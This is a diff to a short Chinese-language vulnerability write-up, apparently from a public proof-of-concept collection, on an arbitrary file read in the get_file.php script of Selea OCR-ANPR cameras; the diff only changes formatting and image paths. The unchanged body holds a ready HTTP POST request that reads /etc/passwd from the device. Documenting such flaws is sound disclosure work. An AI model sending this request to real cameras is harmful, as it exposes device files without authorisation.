@@ -1,8 +1,8 @@
-# Selea OCR-ANPR摄像机 get_file.php 任意文件读取漏洞
+# Selea OCR-ANPR摄像机 get\_file.php 任意文件读取漏洞
 
 ## 漏洞描述
 
-Selea OCR-ANPR摄像机 get_file.php存在 任意文件读取漏洞，通过构造特殊请求获取服务器文件
+Selea OCR-ANPR摄像机 get\_file.php存在 任意文件读取漏洞，通过构造特殊请求获取服务器文件
 
 ## 漏洞影响
 
@@ -28,11 +28,11 @@ Selea Selea Targa IP OCR-ANPR Camera Targa 704 ILB
 
 登录页面如下
 
-![](images/202202140933858.png)
+![](../.gitbook/assets/202202140933858.png)
 
 发送如下请求包
 
-```plain
+```
 POST /cgi-bin/get_file.php HTTP/1.1
 Host: 
 Upgrade-Insecure-Requests: 1
@@ -45,4 +45,4 @@ Cookie: lang=en; PHPSESSID=bvib0lq6lahlhbjnfv91k13ou0
 name=test&files_list=/etc/passwd
 ```
 
-![](images/202202140933222.png)
+![](../.gitbook/assets/202202140933222.png)
